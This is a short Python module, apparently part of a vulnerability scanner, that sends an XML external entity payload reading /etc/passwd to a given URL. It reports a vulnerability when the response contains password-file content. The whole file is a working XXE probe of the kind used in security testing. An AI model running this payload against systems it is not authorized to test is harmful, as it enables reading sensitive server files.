import aiohttp

async def scan(url, config):
    print(f"[XXE] Scanning {url}")
    xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, data=xxe_payload, headers=headers, timeout=config['timeout']) as resp:
                text = await resp.text()
                if "root:" in text:
                    print(f"[CRITICAL] XXE vulnerability at {url}")
        except Exception:
            pass
